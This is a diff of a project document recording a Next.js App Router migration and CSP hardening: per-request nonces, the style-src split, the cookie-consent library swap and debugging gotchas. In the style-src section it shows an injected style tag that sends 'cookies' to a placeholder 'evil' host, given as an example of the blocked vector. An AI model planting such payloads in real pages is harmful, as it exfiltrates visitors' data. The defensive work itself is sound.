@@ -1,130 +1,163 @@
 # CSP and Next.js Roadmap
 
-> Forward-looking roadmap for Content Security Policy hardening, Next.js framework upgrades, and the architectural decisions that gate them. Captures lessons from the 2026-05-24 hardening session so future work avoids the same dead ends.
+> Historical record of the CSP hardening + Next.js modernization project. All originally deferred items have shipped. Lessons learned during implementation are captured at the bottom so future agents don't re-discover them.
 
 ---
 
-## Current state (as of 2026-05-24, commit `56c27e1`)
+## Current state (as of 2026-05-26, after `app-router-next16` branch merge)
 
-**Framework**: Next.js 14.2.35 (Pages Router), React 18, Tailwind 3.4.19, OpenAI 5.23.2, TypeScript 5.9.3. Bun 1.3.8 pinned in CI.
+**Framework**: Next.js 16.2.6 (App Router), React 19.2.6, Tailwind 3.4.19, OpenAI SDK 5.23.2, vanilla-cookieconsent 3.1.0, TypeScript 5.9.3. Bun 1.3.8 pinned in CI.
 
-**Rendering**: every public page is statically pre-rendered at build time. No page uses `getServerSideProps` (only `_document.tsx` and `pages/sitemap.xml.tsx` use any SSR primitives). This is the architectural fact that gates everything else on this list.
+**Rendering**: every route renders dynamically per request via `export const dynamic = 'force-dynamic'` in `app/layout.tsx`. This is the cost of nonce-based CSP — there is no static prerendering on this site except `/sitemap.xml`. TTFB is +20–100ms vs the prior fully-static build; Render's instance billing model means cost impact is negligible at our traffic.
 
-**CSP** (set in `next.config.js` `headers()`):
-- `script-src 'self' 'unsafe-eval' 'unsafe-inline' https://www.googletagmanager.com https://www.google-analytics.com`
-- `style-src 'self' 'unsafe-inline' https://fonts.googleapis.com`
+**CSP** (set in `proxy.ts`, per-request nonce via `btoa(crypto.randomUUID())`):
+- `script-src 'self' 'nonce-<…>' 'strict-dynamic' https://www.googletagmanager.com https://www.google-analytics.com` — `'unsafe-eval'` is in dev only (React Refresh needs it)
+- `style-src 'self' 'unsafe-inline' https://fonts.googleapis.com` (fallback for ancient browsers)
+- `style-src-elem 'self' https://fonts.googleapis.com` — modern browsers: strict, no `<style>` tag injection
+- `style-src-attr 'unsafe-inline'` — modern browsers: allow React `style={{}}` props (~149 in the codebase)
+- `upgrade-insecure-requests` only when the request itself was HTTPS (Render terminates TLS upstream and sets `x-forwarded-proto: https`); skipped locally so dev over HTTP doesn't break
 - Strict non-script directives: `object-src 'none'`, `frame-ancestors 'none'`, `base-uri 'self'`, `form-action 'self'`
-- Image / font / connect / media src scoped to GA + Google Tag Manager origins
+- Set `CSP_REPORT_ONLY=true` in env to ship the policy in report-only mode (safety-net for first deploys of CSP changes)
 
-**Inline scripts/styles of our authorship**: zero. Cookie-consent bootstrap is in `public/static/cookieconsent-init.js`; critical CSS is in `styles/global.css`. The only remaining inline content is Next.js's `<script id="__NEXT_DATA__">` hydration blob, per-page JSON-LD blocks, and Next.js's runtime FOUC `<style data-next-hide-fouc>` tags. All require `'unsafe-inline'` and are not removable without architectural change.
+**Auto-noncing**: Next 16 auto-attaches the request's nonce to every framework script tag in the served HTML (including inline RSC payload scripts). Our own JSON-LD `<script>` tags in `app/<route>/page.tsx` files explicitly thread the nonce via `headers()` from `next/headers`.
 
-**Automation**: Dependabot watches `bun` + `github-actions` weekly (Mondays 9am PT), with majors ignored for `next` / `react` / `react-dom` / `tailwindcss` / `openai` / `typescript` / `@types/*` so framework migrations land deliberately.
+**Inline scripts/styles of our authorship**: zero `<style>` tags. JSON-LD blocks are inline `<script>` tags with nonce. Cookie consent runs from `components/CookieConsentLoader.tsx` via dynamic `import('vanilla-cookieconsent')` from a `'use client'` component — bundled into Next's nonced client chunks, no inline anything.
 
----
+**Service worker** (`public/sw.js`): page HTML is **network-only**, never cached. Per-request nonces make HTML caching impossible — cached HTML would ship a stale nonce that wouldn't match the current response's CSP, blocking every framework script. `CACHE_VERSION` was bumped `v2.0.0 → v3.0.0` at the migration cutover to invalidate any v2 caches in returning users' browsers.
 
-## Session log: PRs landed 2026-05-24
-
-| # | Title | What it shipped |
-|---|---|---|
-| 1 | Bump deps, add Dependabot, pin Bun in CI | `fast-xml-parser` 5.2.5→5.8.0 (critical CVE), `next` 14.2.35, `openai` 5.23.2, Dependabot config, Bun pinned to 1.3.8 |
-| 2 | Bump actions/checkout 4→6 | Dependabot's first auto-PR, validating the config |
-| 3 | Clear lint warnings, delete unused `TypewriterText`, fix `useCallback` bug | 8 lint warnings → 0; real bug: `handlePauseVideos` re-identity caused effect to re-run every render |
-| 4 | Correct README CSP claim + remove dead nonce code | README falsely claimed nonce-based CSP; `_document.tsx` had nonce code that was overridden by `next.config.js` AND wouldn't work on static pages anyway |
-| 5 | Strip stale doc references | TypewriterText references in `README.md` + `docs/DEVELOPMENT.md`; deleted `docs/TYPEWRITER_ANIMATION.md` (261-line spec for a feature that never shipped) |
-| 6 | Extract inline scripts/styles | Cookie-consent init → `public/static/cookieconsent-init.js`; critical CSS → `styles/global.css`; `_document.tsx` 117→22 lines |
-| 7 | Hotfix: revert style-src split | PR #6 had also split `style-src` into `style-src-elem` (strict) + `style-src-attr`; broke cookie consent in prod because the library runtime-injects `<style>` elements via `document.createElement('style')` + `.sheet.insertRule(...)` |
+**Automation**: Dependabot watches `bun` + `github-actions` weekly (Mondays 9am PT). Majors are NOT ignored anymore for `next`/`react`/`react-dom` (they were before this migration, can be re-pinned if desired).
 
 ---
 
-## Deferred work, in priority order
+## What shipped on `app-router-next16` branch (2026-05-26)
 
-### 1. App Router migration (the big one)
+A single bundled PR that closed all 6 originally-deferred items plus structural framework upgrade:
 
-**Why first**: it's the single architectural change that unlocks most of the items below. Doing those items before this means writing throwaway bridge code.
+### 1. Pages Router → App Router (the foundation)
 
-**What it gets you**:
-- Real nonce-based CSP (App Router threads nonces through framework-injected scripts via `next/headers`)
-- React Server Components — drop ~178KB first-load JS bundle significantly
-- Server Actions — `/api/chat` and Contact form become co-located server functions instead of separate API routes
-- Streaming SSR + Suspense — better TTFB, granular loading states
-- Partial Pre-Rendering (Next 15+) — static shell + dynamic holes in same page
-- Turbopack production builds — faster dev + build cycles
-- Better error boundaries via `error.tsx` / `loading.tsx` / `not-found.tsx` per route
+Every page moved from `pages/<route>.tsx` to `app/<route>/page.tsx` + `<Route>Client.tsx` using the **server-wrapper pattern**:
+- `page.tsx` is a server component, `async`, reads `nonce` via `await headers()`, exports `metadata` + `viewport`, renders Header + JSON-LD `<script nonce={nonce}>` + `<RouteClient />` + Footer
+- `<Route>Client.tsx` has `'use client'` directive and contains the original page's JSX/hooks (Head removed, JSON-LD removed — moved up to the server wrapper)
 
-**Scope**: ~2-3 focused days for this codebase. ~15 page files + 2 API routes + ~10 components to audit for client/server boundary. Plus regression testing every visual + interactive feature.
+Why split: Metadata API only exports from server components. Pages with `'use client'` directive can't export `metadata`. Server wrapper handles metadata + nonce reading; client child handles interactive behavior. Clean separation.
 
-**Migration shape**:
-- `pages/*.tsx` → `app/*/page.tsx` (folder-per-route)
-- `_app.tsx` + `_document.tsx` → `app/layout.tsx` + Metadata API
-- `pages/api/*.ts` → `app/api/*/route.ts` (different handler signature)
-- Mark interactive components (Marquee, Contact, anything with hooks/event handlers) with `"use client"` directive
-- Upgrade to Next 15 or 16 at the same time
+### 2. Next 14 → 16, React 18 → 19
 
-**Should be its own scoped project, not bolted onto smaller work.**
+Dep bumps in one shot:
+- `middleware.ts` renamed to `proxy.ts` per Next 16 convention (function name `middleware` → `proxy`)
+- `headers()`, `cookies()`, `params`, `searchParams` became async — every call site `await`s now
+- Turbopack default for both `next dev` and `next build` — no custom webpack config so no impact
+- `next lint` removed — we never used it (Biome runs directly)
+- `images.minimumCacheTTL` default changed 60s → 14400s; kept our explicit 60 override
+- `JSX` namespace removed from React 19 globals — added `import type { JSX } from 'react'` where needed (Footer, Header)
+- Node ≥ 20.9 required
 
-### 2. Strip `'unsafe-inline'` from `script-src` (downstream of #1)
+### 3. Nonce CSP — `'unsafe-inline'` and `'unsafe-eval'` out of `script-src`
 
-With App Router done, set per-request nonce in middleware via `NextResponse.next({ request: { headers: { 'x-nonce': nonce } } })` and Server Components read it via `headers()` from `next/headers`. The framework auto-threads the nonce through `__NEXT_DATA__` (or its App Router equivalent — there's an `<script>` for RSC payloads that needs the same treatment).
+`proxy.ts` generates a per-request nonce, injects it into request headers as `x-nonce`, and sets the CSP response header with `'nonce-<…>' 'strict-dynamic'`. Server components consume the nonce via `await headers()` from `next/headers` and thread it to their `<script>` tags. Framework scripts get auto-nonced by Next 16.
 
-### 3. Replace cookie consent library (downstream of #1)
+CSP moved from `next.config.js` headers (static) to `proxy.ts` (per-request). Non-CSP security headers (HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy) stayed in `next.config.js` since they're request-independent.
 
-**Why**: the current Osano library does runtime `<style>` injection via `document.createElement('style')` + `.sheet.insertRule(...)`. Incompatible with strict `style-src-elem` (no `'unsafe-inline'`). Even with App Router nonces, this pattern can't be made strict-CSP-compatible — the dynamically created `<style>` element can't be nonced after creation.
+### 4. Osano cookie consent → vanilla-cookieconsent v3.1.0
 
-**Options when ready**:
-- **Roll our own** (~100-150 lines): show banner, persist consent to localStorage, fire callbacks on Accept/Deny. Full control, CSS-class-based only, no runtime style injection. This is the cleanest path.
-- **vanilla-cookieconsent v3**: modern fork that uses CSS variables for theming. CSP-friendly. ~25KB.
-- **Klaro**: another CSP-aware open-source option.
+`components/CookieConsentLoader.tsx` (new) dynamically imports vanilla-cookieconsent and its CSS from a `'use client'` `useEffect`. Theme via CSS variables (`--cc-bg`, `--cc-btn-primary-bg`, etc.) in `styles/global.css`. GA loader gated on `onConsent`/`onChange` callbacks via `acceptedCategory('analytics')`.
 
-**Why not do this independently**: pointless until `style-src` is otherwise ready to be tightened. Until then, `'unsafe-inline'` is needed anyway (Next.js's own runtime style injection forces it), so swapping the library is no-op security-wise.
+Why swap: Osano runtime-injects `<style>` elements via `document.createElement('style')` + `.sheet.insertRule()` — incompatible with strict `style-src-elem` regardless of nonces. vanilla-cookieconsent v3 ships a single bundled CSS file (no runtime injection) so it works under strict CSP. Roll-your-own (~150 lines) was rejected as it would have been a half-finished library.
 
-### 4. Strip `'unsafe-inline'` from `style-src` (downstream of #1 AND #3)
+Deleted: `public/static/cookieconsent.js`, `public/static/cookieconsent.css`, `public/static/cookieconsent-init.js`.
 
-Requires both:
-- App Router (for nonce support on Next.js's framework styles)
-- Cookie consent replaced (so no library runtime-injects `<style>` elements)
+### 5. Style-src split
 
-Plus: audit Tailwind/CSS-in-JS interaction with nonce CSP — some setups inject `<style>` tags at runtime in dev and need explicit nonce handling.
+- `style-src-elem 'self' https://fonts.googleapis.com` — strict; blocks injected `<style>` tags (the real XSS vector — `<style>body{background:url(http://evil/?cookies)}</style>`)
+- `style-src-attr 'unsafe-inline'` — allows React `style={{}}` props (~149 across the codebase for parallax, animation, dynamic colors)
+- Parent `style-src 'self' 'unsafe-inline' https://fonts.googleapis.com` retained as fallback for browsers that don't honor the granular directives
 
-### 5. Reduce React inline `style={{}}` usage (always-on opportunity, optional)
+### 6. Service worker tightening
 
-The site has ~149 `style={{}}` props. Most are necessary (parallax transforms, Framer Motion bindings, dynamic colors). A subset are static and could move to Tailwind classes. Net security gain: small (style-src-attr is a much lower-leverage XSS lever than script-src). Net code quality gain: moderate. **Worth doing opportunistically, not as a dedicated project.**
+`public/sw.js`:
+- `STATIC_CACHE_URLS` reduced from `['/', '/home', '/about', ..., '/manifest.json']` to just `['/manifest.json']`
+- `handlePageRequest` rewritten stale-while-revalidate → network-only
+- `CACHE_VERSION` `v2.0.0` → `v3.0.0` to bust any v2 caches in returning visitors' browsers
 
-### 6. Other items lurking in the audit
+### 7. Custom `app/not-found.tsx`
 
-- Lint warnings: currently 0 (cleared in #3). Keep at 0.
-- Inline `style={{}}` props: see #5.
-- `'unsafe-eval'` in `script-src`: needed for Framer Motion and some Next.js framework paths. Re-evaluate after App Router migration — App Router + Next 15+ may not need it.
+Next's default not-found component ships its React tree (including `body{background:#fff}` styles) serialized in every page's RSC payload. During hydration the subtree briefly mounts before its boundary collapses → white flash on every page. Replacing it with our own dark-themed `app/not-found.tsx` swaps the default tree in the RSC payload.
 
 ---
 
-## Gotchas learned this session (read before retrying)
+## Gotchas hit during implementation (read before similar projects)
 
-1. **Nonce CSP on Pages Router with static pre-rendering is architecturally infeasible.** `ctx.req` is `undefined` in `_document.getInitialProps` at build time. Don't try to wire up nonces in `_document.tsx` — verified empirically; every `nonce={nonce}` rendered as `nonce=""`. See git log around 2026-05-24 for the dead-end branch.
+These are the bugs that took multiple debug cycles to find. All documented inline in code where relevant; collected here for visibility.
 
-2. **`'unsafe-inline'` is NOT just there for Google Analytics.** GA loads from `https://www.googletagmanager.com` — covered by the host allowlist, doesn't need `'unsafe-inline'`. The actual things needing `'unsafe-inline'` in script-src: Next.js's `<script id="__NEXT_DATA__">` hydration blob (`type="application/json"`) and per-page JSON-LD blocks (`type="application/ld+json"`). Both are inline data, not executable, but CSP enforces script-src on them regardless of type.
+### 1. Tailwind `content` paths went stale silently
+`tailwind.config.js` `content` array pointed at `./pages/**/*` which got deleted. Tailwind generated CSS with only the classes used in `components/**` — pages rendered with structural HTML but missing all colors/sizes/layouts. No error, no warning. CSS bundle dropped from ~49KB (correct) to ~38KB.
 
-3. **`style-src-elem` strict cannot ship while the current cookie consent library is in use.** PR #6 tried it, PR #7 reverted it. The library creates `<style>` elements at runtime — strict `style-src-elem 'self'` blocks them, `element.sheet` returns `null`, `cookieconsent.initialise()` throws on `u.sheet.insertRule(...)`.
+**Symptom**: pages render structurally but visually broken. **Fix**: update `content: ['./app/**/*.{js,ts,jsx,tsx}', './components/**/*.{js,ts,jsx,tsx}']`.
 
-4. **Next.js emits inline `<style data-next-hide-fouc>` tags in PRODUCTION too**, not just dev. Don't assume dev-only behavior — verify in a real production build before tightening style-src.
+### 2. Static prerender + per-request nonce = blocked scripts
+A statically prerendered page has nonce attributes baked into framework `<script>` tags at build time. When the proxy injects a *per-request* nonce into the CSP header, the build-time nonces don't match → every script blocked. Real-browser-only failure mode (HTTP-only smoke tests pass because they don't execute JS).
 
-5. **Hash-based CSP for the JSON-LD blocks is technically possible but pointless while `'unsafe-inline'` is still required for `__NEXT_DATA__`.** Adding hashes alongside `'unsafe-inline'` does nothing — browsers use the most permissive matching rule. Hashes would only become useful after App Router removes the need for `'unsafe-inline'` on `__NEXT_DATA__`.
+**Symptom**: `/privacy` (and any page without `headers()` reads) ships 20 unnonced framework scripts. **Fix**: `export const dynamic = 'force-dynamic'` in `app/layout.tsx` — every route renders dynamically per request.
 
-6. **After deploys, hard-refresh in the browser before debugging "broken site" reports.** Next.js generates a new `buildId` per build. Static HTML hardcodes the buildId into asset paths. Cached old HTML → 404s on new buildId asset paths → cascade of `nosniff` rejection + router hard-navigate errors. Hard refresh (Cmd+Shift+R) clears the HTML cache.
+### 3. `upgrade-insecure-requests` breaks local HTTP dev
+Once we set `upgrade-insecure-requests` in CSP, Safari (strictest of the browsers) upgrades every subresource URL from `http://` to `https://`. Production behind Render's TLS terminator: fine. Local `http://localhost:4321`: every asset fails TLS handshake → blank page with TLS errors in console.
+
+**Fix**: in `proxy.ts`, only emit `upgrade-insecure-requests` when `request.headers.get('x-forwarded-proto') === 'https' || request.nextUrl.protocol === 'https:'`.
+
+### 4. Default `not-found` ships white body CSS to every page
+See §7 above. Next's default not-found component serializes `body{background:#fff}` into the RSC payload of every route, causing brief white flashes during hydration. **Fix**: `app/not-found.tsx` override.
+
+### 5. Negative z-index + opaque `<body>` background = hidden elements
+We added `<body style={{ background: '#000' }}>` to mask transient white flashes. This broke background videos on 5 pages that used `z-[-10]` wrappers — body's solid background paints OVER negative-z-index elements in the same stacking context (positive z-index elements paint AFTER body bg in the CSS stacking algorithm).
+
+**Symptom**: background videos rendered as black on `/projects`, `/blog`, `/news`, `/faq`, `/operations-consulting`, `/about`. **Fix**: `z-[-10]` → `z-0` across all 5 wrappers; their parent `<main>` elements already had `z-10` so layering still works.
+
+### 6. Skip-nav `focus:not-sr-only` triggered by Next's WCAG auto-focus
+Next 16 App Router auto-focuses content after client-side navigation for screen-reader users. That programmatic `.focus()` triggers the `:focus` pseudo-class on the skip-nav link, popping it visually via `focus:not-sr-only`. Switching to `focus-visible:` helped but Safari's focus-visible heuristic still occasionally treated post-navigation focus as keyboard-derived.
+
+**Fix**: skip-nav is now permanently `sr-only` (screen readers still announce + activate it; sighted keyboard users no longer see a visible cue on Tab, which is the only accessibility regression).
+
+### 7. Safari caches backdrop-filter compositor across soft navigations
+`backdrop-filter: blur(4px)` on `.header` caused a stale-backdrop visual glitch in Safari during App Router soft navigations — until any user click triggered a repaint. Synthetic repaint via `transform: translateZ(0)` made it worse.
+
+**Fix**: removed `backdrop-filter` entirely. Header is now a flat `rgba(0,0,0,0.7)` translucent strip (`0.85` when scrolled). Sacrifices the frosted-glass aesthetic; not worth the visual bug.
+
+### 8. Video element first-frame decode = brief white flash
+Video elements rendered nothing until their first frame decoded, and Safari's "empty video" default rendering can be light. Adding `preload="auto"`, explicit `width`/`height`, `poster="data:image/png;base64,..."` (1×1 black), and `background: '#000'` mitigated most cases. The structural fix was rendering BOTH `<Image>` (for /home) and `<video>` (for other pages) permanently and toggling visibility via Tailwind `hidden` class — so nothing re-mounts on client-side navigation.
+
+### 9. Bun's `Buffer` vs Edge `btoa`
+`proxy.ts` runs on Node (Next 16 dropped Edge support for `proxy`). Both `Buffer.from(...)` and `btoa(...)` work but `btoa` is shorter and runtime-agnostic. We use `btoa(crypto.randomUUID())` for the nonce.
+
+### 10. Render `x-forwarded-proto` is load-bearing
+Render terminates TLS and forwards as `http://` internally, setting `x-forwarded-proto: https`. Our `upgrade-insecure-requests` conditional and `request.headers.get('x-forwarded-for')` IP detection both depend on this header being honored. Confirmed working; if Render's proxy config ever changes, both will need re-validation.
 
 ---
 
-## Recommended sequencing for next session
+## Open opportunistic items (not blockers)
 
-1. **Plan the App Router migration as a deliberate project.** Pick a focused 2-3 day window. Branch off `main`. Migrate one route at a time, smoke-testing each. Use Next 15 (or 16 if stable when you start) and React 19. Coordinate the deps bump in the same branch.
-2. **In the App Router branch, also do nonce CSP** — they're natural together.
-3. **Replace cookie consent library** in the same branch or immediately after — required to fully tighten `style-src`.
-4. **Drop `'unsafe-inline'` from both `script-src` and `style-src`.** Test exhaustively before deploy. Ship behind `Content-Security-Policy-Report-Only` first if you want a safety net.
-5. **Opportunistically reduce inline `style={{}}` usage** during App Router page rewrites — natural to do while the file is open anyway.
+### 1. Inline `style={{}}` props → Tailwind classes
+~149 `style={{}}` props remain (parallax transforms, dynamic colors, animations). Most are necessary (Framer Motion bindings, dynamic values), a subset is static and could move to Tailwind. Net security gain: small (`style-src-attr` is a much lower-leverage XSS vector than `script-src`). **Do opportunistically when touching files, not as a dedicated project.**
+
+### 2. `'unsafe-eval'` in dev only — verify Motion doesn't trip prod
+Currently `'unsafe-eval'` is in `script-src` only when `NODE_ENV === 'development'`. Motion (formerly Framer Motion) v12 in our codebase doesn't appear to use `eval`/`new Function()` based on local testing, but real-traffic verification under enforcing CSP is the safety check. If violations appear in browser console after deploy, add `'unsafe-eval'` to the prod CSP and re-evaluate later.
+
+### 3. `backdrop-filter` blur restoration
+Removed in §7 above. Restoring requires either a WebKit fix for the stale-compositor bug or a different visual approach (e.g., always-solid header background with no blur claim). Low priority — current solid translucent header looks fine.
+
+### 4. Service worker offline page polish
+`getOfflinePage()` in `sw.js` is a synthesized HTML response with inline `<style>` and `onclick`. The SW returns it without CSP headers so the inline content works, but it's a tiny offline-only page. Could be cleaned up but not urgent.
+
+### 5. Bundle reduction via partial-prerendering or static islands
+Every route is `ƒ Dynamic` now. Some routes have stable content that could benefit from PPR or static islands once Next stabilizes those features for App Router with nonce CSP. Investigate post-Next-17.
 
 ---
 
-## Background
+## Files changed by the migration
 
-The hardening direction came from external reviews by Codex and Gemini, plus this assistant's analysis. The session ended with a "Gemini-corrected hybrid" approach: extract what's extractable without forcing SSR or migrating to App Router. The remaining gap (`'unsafe-inline'` for framework + library runtime styles) is intentionally deferred to App Router migration because doing it sooner would mean writing throwaway code or regressing performance via SSR-everywhere.
+| Type | Files |
+|---|---|
+| New | `app/layout.tsx`, `app/not-found.tsx`, `app/sitemap.ts`, `app/*/page.tsx` (×9), `app/*/<Route>Client.tsx` (×9), `app/api/chat/route.ts`, `app/api/substack/route.ts`, `proxy.ts`, `components/AnalyticsTracker.tsx`, `components/CookieConsentLoader.tsx` |
+| Deleted | `pages/` (all 13 files), `middleware.ts`, `public/static/cookieconsent.{js,css,-init.js}`, `docs/CSP-AND-NEXTJS-ROADMAP.md` (replaced by this doc) |
+| Modified | `package.json`, `bun.lock`, `tsconfig.json`, `biome.json`, `tailwind.config.js`, `next.config.js`, `styles/global.css`, `public/sw.js`, all 6 client-using components in `components/` (added `'use client'` + JSX import), `context/ChatContext.tsx` (`'use client'`) |
 
-The full debate between Codex's plan (force SSR + nonce now), Gemini's plan (extract inline + claim JSON-LD isn't CSP-controlled), and the eventual hybrid is in the chat history for that session date if needed.
+Total: ~35 files, +192/-5994 lines (the big deletion is the bundled Osano library + Pages Router page files).
